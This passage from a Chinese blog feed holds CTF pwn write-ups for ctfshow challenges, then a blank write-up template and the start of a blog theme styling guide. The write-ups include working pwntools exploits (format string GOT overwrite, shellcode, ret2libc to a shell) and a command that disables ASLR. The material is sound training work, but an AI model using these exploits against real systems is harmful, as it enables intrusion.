<span class="type">int</span> v2; <span class="comment">// [esp+5Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x50u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"daniu now is :%d!\n"</span>, daniu);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v2;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以看到这里的ptintf(s)明显的存在格式化字符串漏洞</p><p>daniu的地址为： 0x804B038</p><p>![截屏2025-08-11 21.21.42](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 21.21.42.png)</p><p>可以看到daniu在bss段，测一下格式化字符串的偏移，可以看到偏移为7</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别</span></span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程连接</span></span><br><span class="line">io = remote(<span class="string">'pwn.challenge.ctf.show'</span>, <span class="number">28262</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标地址</span></span><br><span class="line">daniu = <span class="number">0x804B038</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造格式化字符串payload</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, {daniu: <span class="number">6</span>})</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload并交互</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>通过shell获取flag。</p><hr><h2 id="31-pwn92"><a href="#31-pwn92" class="headerlink" title="31 pwn92"></a>31 pwn92</h2><p>🚩flag：<code>ctfshow{4f5e810f-72b6-447f-8a30-a74822609048}</code></p><p>💡hint：<code>格式化字符串</code></p><p>可能上一题没太看懂？来看下基础吧</p><p>ida分析函数，得知使用用户输入的格式化字符串将 s 输出，如果需要获取flag，仅仅需要使用 %s 输出flag字符串即可获取flag</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process('./pwn')</span></span><br><span class="line">io = remote(<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28223</span>) </span><br><span class="line">io.sendline(<span class="string">'%s'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="32-pwn93"><a href="#32-pwn93" class="headerlink" title="32 pwn93"></a>32 pwn93</h2><p>🚩flag：<code>ctfshow{cc14b02c-70f9-461e-aa67-96516a0834a0}</code></p><p>💡hint：<code>格式化字符串</code></p><p>emmm，再来一道基础原理？</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  menu();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter your choice: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      func1();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      func2();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      func3();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      func4();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      func5();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      nothing_here();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      exit0();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice. Please enter a valid option."</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>跟进菜单：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Choose an option:"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1.Crash the program"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2.Stack data breaches"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3.Arbitrary address memory leak"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4.Stack data override"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"5.Arbitrary address memory override"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"6. ... "</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>获取flag的地方在case 7 exit0()函数，跟进后发现其实是一个后门函数：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">exit0</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">72</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  stream = fopen(<span class="string">"/ctfshow_flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"/ctfshow_flag: No such file or directory."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>也就是说读取用户输入的时候输入7即可获得flag。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process('./pwn')</span></span><br><span class="line">io = remote(<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28242</span>) </span><br><span class="line">io.sendline(<span class="string">'7'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="33-pwn94"><a href="#33-pwn94" class="headerlink" title="33 pwn94"></a>33 pwn94</h2><p>🚩flag：<code>ctfshow{cc14b02c-70f9-461e-aa67-96516a0834a0}</code></p><p>💡hint：<code>格式化字符串</code></p><p>好了，你已经学会1+1=2了，接下来继续加油吧</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  init();</span><br><span class="line">  logo();</span><br><span class="line">  ctfshow();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>跟进ctfshow()：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+8h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x64u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>进入一个循环，然后其中有明显的格式化字符串漏洞， 看到程序中有system函数，还是可以用格式化字符串漏洞任意写的，将printf_got 指针指向的地址改为 system_plt，再printf(),就相当于 system()了，如果我们再发送 “/bin/sh\x00”,作为其参数,就能getshell了。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#io = process('./fmt')</span></span><br><span class="line">io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">10000</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>) </span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>] </span><br><span class="line">system_plt = elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset,{printf_got:system_plt}) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><hr><blockquote><p>34~37为堆管理器</p></blockquote><h2 id="34-pwn135"><a href="#34-pwn135" class="headerlink" title="34 pwn135"></a>34 pwn135</h2><p>🚩flag：<code>ctfshow{6f51b075-d479-4231-aada-f294823c75fc}</code></p><p>💡hint：<code>堆管理器</code></p><p><strong><code>malloc</code>、<code>calloc</code>、<code>realloc</code> 的作用</strong></p><table><thead><tr><th>函数</th><th>作用</th><th>关键区别</th></tr></thead><tbody><tr><td><strong><code>malloc(size)</code></strong></td><td>分配 <code>size</code> 字节的<strong>未初始化内存</strong>，内容随机（可能含敏感数据）。</td><td>最快，但需手动初始化。</td></tr><tr><td><strong><code>calloc(n, size)</code></strong></td><td>分配 <code>n * size</code> 字节的<strong>初始化为零的内存</strong>（适合数组/结构体）。</td><td>比 <code>malloc</code> 慢，但安全。</td></tr><tr><td><strong><code>realloc(ptr, new_size)</code></strong></td><td><strong>调整已分配内存块的大小</strong>（可扩大/缩小），原数据保留（新部分未初始化）。</td><td>若 <code>ptr</code> 为 <code>NULL</code>，等价于 <code>malloc</code>。</td></tr></tbody></table><p><strong>一句话总结</strong>：<br><code>malloc</code> 分配未初始化内存，<code>calloc</code> 分配并清零内存，<code>realloc</code> 调整已有内存块大小。</p><p>本题输入4拿到flag。</p><hr><h2 id="35-pwn136"><a href="#35-pwn136" class="headerlink" title="35 pwn136"></a>35 pwn136</h2><p>🚩flag：<code>ctfshow{bc477bcf-c4ce-4e20-870e-72aa123b7703}</code></p><p>💡hint：<code>堆管理器</code></p><p>如何释放堆？</p><blockquote><h3 id="free堆块的原理"><a href="#free堆块的原理" class="headerlink" title="free堆块的原理"></a><strong>free堆块的原理</strong></h3><p>当调用 <code>free(ptr)</code> 时，堆管理器会执行以下操作：</p><ol><li><strong>检查指针有效性</strong>：确保 <code>ptr</code> 是由 <code>malloc</code>/<code>calloc</code>/<code>realloc</code> 分配的合法地址，防止双重释放（Double Free）或非法释放。</li><li><strong>标记为未使用</strong>：将该内存块标记为 <code>free</code> 状态（通常通过修改块头部的元数据，如 <code>size</code> 和 <code>in_use</code> 标志位）。</li><li><strong>合并空闲块</strong>：若相邻内存块也是空闲的，合并它们以减少碎片（<code>coalescing</code>）。</li><li><strong>加入空闲链表</strong>：将释放的块插入 <code>free list</code>（如 <code>glibc</code> 的 <code>bin</code>），供后续 <code>malloc</code> 重用，可能触发 <code>brk</code>/<code>mmap</code>调整堆空间。</li></ol><p><strong>关键点</strong>：<code>free</code> 不会立即归还内存给操作系统，而是由堆管理器缓存复用，存在 <strong>Use-After-Free (UAF)</strong> 漏洞风险。</p></blockquote><p>输入4获得flag。</p><hr><h2 id="36-pwn137"><a href="#36-pwn137" class="headerlink" title="36 pwn137"></a>36 pwn137</h2><p>🚩flag：<code>ctfshow{31e71893-ad61-424b-85d7-c3e01878746d}</code></p><p>💡hint：<code>堆管理器</code></p><p>sbrk and brk example</p><blockquote><p><code>sbrk()</code> 和 <code>brk()</code> 是用于管理堆内存的系统调用，**<code>brk()</code> 直接设置堆的结束地址（<code>break</code>指针）到指定位置<strong>，从而扩展或收缩堆空间；</strong><code>sbrk()</code> 则是相对调整，通过增量（正数扩展、负数收缩）移动 <code>break</code> 指针**，并返回调整前的地址。两者共同维护堆的动态内存分配，<code>malloc</code> 等库函数底层依赖它们操作内存，但过度碎片化可能导致性能问题。</p></blockquote><hr><h2 id="37-pwn138"><a href="#37-pwn138" class="headerlink" title="37 pwn138"></a>37 pwn138</h2><p>🚩flag：<code>ctfshow{3c16a2a8-a843-4cae-9eab-511d82ed8f09}</code></p><p>💡hint：<code>堆管理器</code></p><p>Private anonymous mapping example</p><p>当用户申请内存过大时，ptmalloc2会选择通过<strong>mmap</strong>()函数创建匿名映射段供用户使用，并通过<strong>unmmap</strong>()函数进行回收。</p><blockquote><p>当用户申请的内存超过 <code>mmap_threshold</code>（默认 128KB，可通过 <code>mallopt</code> 调整）时，<code>ptmalloc2</code> 会绕过堆区管理，直接调用 <strong><code>mmap()</code></strong> 创建独立的匿名内存映射段（无文件关联，权限为可读写），该段与堆区隔离，减少碎片化影响；释放时调用 <strong><code>munmap()</code></strong> 立即将内存归还操作系统，避免堆缓存带来的延迟或内存泄漏风险。这种机制适合大块内存分配，但频繁使用可能引发缺页中断开销，且地址随机化（ASLR）会降低局部性效率。</p></blockquote><hr><h2 id="38-pwn24"><a href="#38-pwn24" class="headerlink" title="38 pwn24"></a>38 pwn24</h2><p>🚩flag：<code>ctfshow{f615f3c6-b99a-4590-ac95-1f7baf5b974b}</code></p><p>💡hint：<code>Linux安全机制</code></p><p>你可以使用pwntools的shellcraft模块来进行攻击</p><blockquote><p><strong>pwntools的shellcraft模块</strong>是一个用于快速生成各种架构（如x86、ARM、MIPS等）的shellcode的工具库，它提供了预定义的汇编代码片段（如执行<code>/bin/sh</code>、系统调用、文件读写等），用户可通过简单调用（如<code>shellcraft.sh()</code>）自动适配目标平台，无需手动编写底层汇编。其核心作用是<strong>简化漏洞利用开发</strong>，尤其在栈溢出、ROP攻击等场景中，能一键生成可靠的逆向Shell、反弹Shell或权限提升代码，支持动态调整参数（如寄存器、系统调用号），并自动处理字节对齐和NULL字节过滤，大幅提升PWN题或真实漏洞利用的效率与可移植性。</p></blockquote><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#io = process('./pwn')</span></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>, <span class="number">28112</span>) </span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>32位仅部分开启RELRO保护</p><p>可以看到存在一个RWX权限的段，即可读可写可执行的段</p><p>直接IDA查看main函数发现有一个ctfshow函数，但是无法跟进 那么就直接看汇编了：</p><ol><li>函数开始时进行一些栈操作，保存寄存器的值。</li><li>调用 __x86_get_pc_thunk_bx 函数，获取当前的指令位置并存储在 ebx 寄存器中。</li><li>分配 0x84 字节的空间用于缓冲区，存储用户输入的数据。</li><li>调用 read 函数，从标准输入读取数据，并存储到缓冲区。</li><li>调用 puts 函数，将缓冲区的内容打印到标准输出。</li><li>通过调用 call eax 指令，以  eax 寄存器的值作为函数指针，跳转到缓冲区中存储的地址执 行。</li><li>之后是一些清理工作和函数返回的准备操作。</li></ol><p>这题题目提示了可以使用 pwntools的shellcraft模块进行攻击</p><p>shellcraft 模块是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode。 Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。</p><p>shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的 Shellcode。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                 <span class="comment"># 导入  pwntools 库</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span>                      <span class="comment"># 设置日志级别为调试模式</span></span><br><span class="line"><span class="comment">#io = process('./pwn')                           # 本地连接 io = remote("pwn.challenge.ctf.show", 28112)     # 远程连接</span></span><br><span class="line">shellcode = asm(shellcraft.sh())                 <span class="comment"># 生成一个  Shellcode</span></span><br><span class="line">io.sendline(shellcode)                           <span class="comment"># 将生成的  Shellcode 发送到目标主机</span></span><br><span class="line">io.interactive()                                 <span class="comment"># 与目标主机进行交互</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="39-pwn25"><a href="#39-pwn25" class="headerlink" title="39 pwn25"></a>39 pwn25</h2><p>🚩flag：<code>ctfshow{3a6ba94e-fcd7-4427-be46-28c0402728a7}</code></p><p>💡hint：<code>Linux安全机制</code></p><p>开启NX保护，或许可以试试ret2libc</p><blockquote><h3 id="NX保护（No-eXecute）"><a href="#NX保护（No-eXecute）" class="headerlink" title="NX保护（No-eXecute）"></a><strong>NX保护（No-eXecute）</strong></h3><p>NX保护是一种内存保护机制，由CPU和操作系统共同实现，<strong>通过将数据段（如栈、堆）标记为不可执行</strong>（<code>READ/WRITE</code>但无<code>EXECUTE</code>权限），阻止攻击者在这些区域直接执行恶意代码（如shellcode）。其核心目的是防御栈溢出等漏洞利用技术，迫使攻击者转向更复杂的利用方式（如ROP）。现代编译器默认开启NX（通过<code>-z noexecstack</code>选项），可用<code>checksec</code>工具检测程序是否启用该保护。</p><hr><h3 id="ret2libc（Return-to-libc）"><a href="#ret2libc（Return-to-libc）" class="headerlink" title="ret2libc（Return-to-libc）"></a><strong>ret2libc（Return-to-libc）</strong></h3><p>ret2libc是一种绕过NX保护的漏洞利用技术，<strong>通过覆盖返回地址跳转到libc库中的函数</strong>（如<code>system</code>、<code>execve</code>），而非直接执行shellcode。攻击步骤通常为：1) 泄露libc基地址（利用<code>puts</code>或<code>printf</code>）；2) 计算目标函数（如<code>system("/bin/sh")</code>）的真实地址；3) 构造ROP链调用该函数。这种技术依赖程序动态链接libc的特性，无需注入代码，但需处理地址随机化（ASLR）和参数传递问题。</p></blockquote><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别和架构</span></span><br><span class="line">context(log_level=<span class="string">'debug'</span>, arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程连接</span></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>, <span class="number">28233</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载ELF文件</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">main_addr = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次payload：泄露write函数的真实地址</span></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"write address:"</span>, <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用LibcSearcher查找匹配的libc版本</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次payload：调用system("/bin/sh")</span></span><br><span class="line">payload2 = cyclic(<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(main_addr) + p32(bin_sh_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取交互式shell</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="40-pwn-26"><a href="#40-pwn-26" class="headerlink" title="40 pwn 26"></a>40 pwn 26</h2><p>🚩flag：<code>ctfshow{3a6ba94e-fcd7-4427-be46-28c0402728a7}</code></p><p>💡hint：<code>Linux安全机制</code></p><p>设置好 ASLR 保护参数值即可获得flag</p><p>为确保flag正确，本题建议用提供虚拟机运行</p><p><a href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA">libc下载地址</a></p><p>提取码为： <strong>show</strong></p><blockquote><p><strong>ASLR（Address Space Layout Randomization，地址空间布局随机化）</strong>是一种安全防护机制，由操作系统在程序运行时<strong>动态随机化内存布局</strong>（如栈、堆、libc库的基地址），使得攻击者难以预测关键数据或代码的绝对地址（如<code>system</code>函数、<code>/bin/sh</code>字符串），从而阻止基于固定地址的漏洞利用（如栈溢出、ROP链）。ASLR通过增加攻击者定位目标的难度，有效防御大多数内存攻击，但若结合信息泄露漏洞（如格式化字符串、UAF）获取随机化后的地址，仍可能被绕过。现代操作系统（如Linux、Windows）默认全局开启ASLR，可通过<code>cat /proc/sys/kernel/randomize_va_space</code>查看配置（<code>2</code>表示完全启用）。</p></blockquote><blockquote><p>可以将该文件的值设置为以下几个选项之一来控制 ASLR 的行为：</p><ul><li>0：关闭 ASLR，内存布局不随机化。</li><li>1：启用 ASLR，但只有堆和栈是随机化的。</li><li>2：启用完整的 ASLR，所有内存段（包括堆、栈、共享库等）都是随机化的。</li></ul></blockquote><p>使用命令设置 ASLR 的级别 ：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"0"</span> &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></tbody></table></figure><p>flag is ：ctfshow{0x400687_0x400560_0x603260_0x7ffff7fd64f0} </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[CTF][Web] 题目名称</title>
      <link href="/2026/01/29/CTF%E9%A2%98%E8%A7%A3%E6%A8%A1%E6%9D%BF/"/>
      <url>/2026/01/29/CTF%E9%A2%98%E8%A7%A3%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<h2 id="一、题目信息"><a href="#一、题目信息" class="headerlink" title="一、题目信息"></a>一、题目信息</h2><ul><li>比赛 / 平台：</li><li>题目类型：Web</li><li>难度（主观）：</li><li>是否独立完成：是 / 否</li></ul><hr><h2 id="二、环境-入口"><a href="#二、环境-入口" class="headerlink" title="二、环境 &amp; 入口"></a>二、环境 &amp; 入口</h2><ul><li>环境：Docker / 远程 / 本地</li><li>访问地址：</li><li>初始功能点：<ul><li>登录</li><li>文件上传</li><li>查询接口</li><li>其他：</li></ul></li></ul><hr><h2 id="三、我的第一反应（非常重要）"><a href="#三、我的第一反应（非常重要）" class="headerlink" title="三、我的第一反应（非常重要）"></a>三、我的第一反应（非常重要）</h2><blockquote><p><strong>看到题目的第一直觉</strong></p></blockquote><ul><li>第一眼我觉得这是在考：</li><li>我最先尝试了：</li><li>当时的判断是否正确：</li></ul><p>（哪怕是错的，也一定要写）</p><hr><h2 id="四、分析过程（核心）"><a href="#四、分析过程（核心）" class="headerlink" title="四、分析过程（核心）"></a>四、分析过程（核心）</h2><h3 id="1️⃣-我做了哪些尝试"><a href="#1️⃣-我做了哪些尝试" class="headerlink" title="1️⃣ 我做了哪些尝试"></a>1️⃣ 我做了哪些尝试</h3><ul><li>尝试了什么 payload / 操作</li><li>哪些是无效的</li><li>哪一步开始有反馈</li></ul><h3 id="2️⃣-关键线索"><a href="#2️⃣-关键线索" class="headerlink" title="2️⃣ 关键线索"></a>2️⃣ 关键线索</h3><ul><li>可控参数：</li><li>异常回显：</li><li>源码 / 前端 JS 线索：</li></ul><hr><h2 id="五、突破点"><a href="#五、突破点" class="headerlink" title="五、突破点"></a>五、突破点</h2><blockquote><p><strong>真正打开局面的地方</strong></p></blockquote><ul><li>是哪一个点让我意识到方向对了？</li><li>为什么之前没想到？</li><li>这个点本质在考什么能力？</li></ul><hr><h2 id="六、解题思路（简化版）"><a href="#六、解题思路（简化版）" class="headerlink" title="六、解题思路（简化版）"></a>六、解题思路（简化版）</h2><blockquote><p>不追求“标准”，只写你能复盘的版本</p></blockquote><ol><li>做了什么</li><li>利用了什么漏洞</li><li>最终结果</li></ol><p>（可附关键 payload，但不强制）</p><hr><h2 id="七、知识点总结"><a href="#七、知识点总结" class="headerlink" title="七、知识点总结"></a>七、知识点总结</h2><ul><li>新学到的知识点：</li><li>不熟但必须补的内容：</li><li>相关关键词：</li></ul><hr><h2 id="八、复盘（比题解更重要）"><a href="#八、复盘（比题解更重要）" class="headerlink" title="八、复盘（比题解更重要）"></a>八、复盘（比题解更重要）</h2><ul><li>这题暴露了我哪些问题？</li><li>是知识盲区，还是经验不足？</li><li>如果重来一次，我会怎么做？</li></ul><hr><h2 id="九、延伸-TODO"><a href="#九、延伸-TODO" class="headerlink" title="九、延伸 &amp; TODO"></a>九、延伸 &amp; TODO</h2><ul><li>类似题型：</li><li>推荐复现的题：</li><li>需要补的基础知识：</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql-injection </tag>
            
            <tag> xss </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极简风美化教程</title>
      <link href="/2026/01/29/%E6%9E%81%E7%AE%80%E9%A3%8E%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/"/>
      <url>/2026/01/29/%E6%9E%81%E7%AE%80%E9%A3%8E%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Butterfly-极简风美化教程（内容优先｜功能性｜舒适耐看）"><a href="#Butterfly-极简风美化教程（内容优先｜功能性｜舒适耐看）" class="headerlink" title="Butterfly 极简风美化教程（内容优先｜功能性｜舒适耐看）"></a>Butterfly 极简风美化教程（内容优先｜功能性｜舒适耐看）</h1><blockquote><p>目标：把 Hexo + Butterfly 调成 <strong>“极简、内容优先、功能齐全但不花哨”</strong> 的状态。<br>核心原则：<strong>少动效、少噪音、少装饰；高可读、高一致性、高维护性</strong>。</p></blockquote><hr><h2 id="1-极简风的“设计准则”（先定方向再改配置）"><a href="#1-极简风的“设计准则”（先定方向再改配置）" class="headerlink" title="1. 极简风的“设计准则”（先定方向再改配置）"></a>1. 极简风的“设计准则”（先定方向再改配置）</h2><p>极简不等于“什么都关掉”，而是把视觉注意力交还给内容：</p><ul><li><strong>降低干扰</strong>：打字机字幕、背景特效、花里胡哨的脚本能不用就不用</li><li><strong>提升阅读体验</strong>：字体、行距、段落间距、代码块、引用块、目录</li><li><strong>信息密度适中</strong>：首页摘要不要太长；侧边栏不要堆满小组件</li><li><strong>性能与稳定性</strong>：减少外链 JS、避免重复依赖（例如多余的 jQuery）</li></ul><hr><h2 id="2-你当前配置里，最影响“极简”的点（建议优先处理）"><a href="#2-你当前配置里，最影响“极简”的点（建议优先处理）" class="headerlink" title="2. 你当前配置里，最影响“极简”的点（建议优先处理）"></a>2. 你当前配置里，最影响“极简”的点（建议优先处理）</h2><p>结合你贴出来的 <code>_config.butterfly.yml</code> 